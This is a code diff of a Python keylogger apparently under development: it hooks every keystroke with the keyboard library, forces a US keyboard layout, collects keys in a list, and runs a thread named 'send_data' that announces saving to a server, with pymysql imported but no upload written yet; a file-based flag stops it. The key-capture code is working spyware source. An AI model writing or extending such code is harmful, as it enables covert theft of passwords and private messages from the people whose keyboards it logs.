@@ -1,23 +1,24 @@
-from threading import Thread, Lock, Condition
+from threading import Thread
 import sys
 from win32api import LoadKeyboardLayout
 import keyboard
-import time
-import pendulum
+
 import pymysql
+from time import time, sleep
 
 
-class App():
+class App:
     def __init__(self):
         self.kill_send_info = False
         self.kill_keyboard = False
 
-        self.th1 = Thread(target=self.start_keylogger)
-        self.th2 = Thread(target=self.send_data)
-        self.th3 = Thread(target=self.check_params)
+        self.th1 = Thread(target=self.check_params)
+        self.th2 = Thread(target=self.start_keylogger)
+        self.th3 = Thread(target=self.send_data)
 
         self.data = []
 
+        self.x1 = time()
 
     def get_keyboard_pressed(self, e):
         if e.event_type == 'up':
@@ -25,31 +26,42 @@ class App():
             print(f'You pressed: {e.name}')
             print(f'\n\nYou list is: {self.data}')
 
-
-
-
     def start_keylogger(self):
-        if self.kill_keyboard == False:
+        LoadKeyboardLayout('00000409', 1)
+        if not self.kill_keyboard:
             keyboard.hook(self.get_keyboard_pressed)
             # keyboard.wait()
         else:
             print('EXITING')
             sys.exit()
 
+    def dublicated_keys(self):
+        dic_to_replace = {'#': '3', '%': '5'}
+        return [dic_to_replace.get(n, n) for n in self.data]
+
+    def clear_history(self):
+        self.data.clear()
+
+    def total_key_pressed(self, list):
+        res = dict((i, list.count(i)) for i in list)
+        return res
 
     def send_data(self):
         if self.kill_send_info == False:
-            # print(f'Saving data to server!')
+            print(f'Saving data to server!')
+            clear_data = self.dublicated_keys()
+            self.clear_history()
+            print(self.total_key_pressed(clear_data))
 
 
 
-
-            time.sleep(3)
+            sleep(5)
             self.send_data()
         else:
             print('Sending data was STOPPED!')
+            self.x2 = time()
+            print(f'The program finished in: {self.x2 - self.x1}sec.')
             sys.exit()
-
 
     def check_params(self):
         try:
@@ -59,9 +71,9 @@ class App():
                     self.kill_send_info = True
                     sys.exit()
                 else:
-                    date = pendulum.now()
+
                     # print(f'Flags are working [{date.hour}:{date.minute}:{date.second}]')
-                    time.sleep(5)
+                    sleep(5)
                     self.check_params()
         except Exception as err:
             print(f'Error: \n{err}. \nWe will create file now.')
@@ -69,18 +81,11 @@ class App():
                 file.write('Working')
             self.check_params()
 
-
-
-
     def run(self):
-        self.th1.start()  # start first Thread - start_keylogger
-        self.th2.start()  # start second Thread - send_data
-        self.th3.start()  # start third Thread - check_params
-
-
-
+        self.th1.start()  # start first Thread - check_params
+        self.th2.start()  # start second Thread - start_keylogger
+        self.th3.start()  # start third Thread - send_data
 
 
 if __name__ == '__main__':
-    LoadKeyboardLayout('00000409', 1)
     App().run()
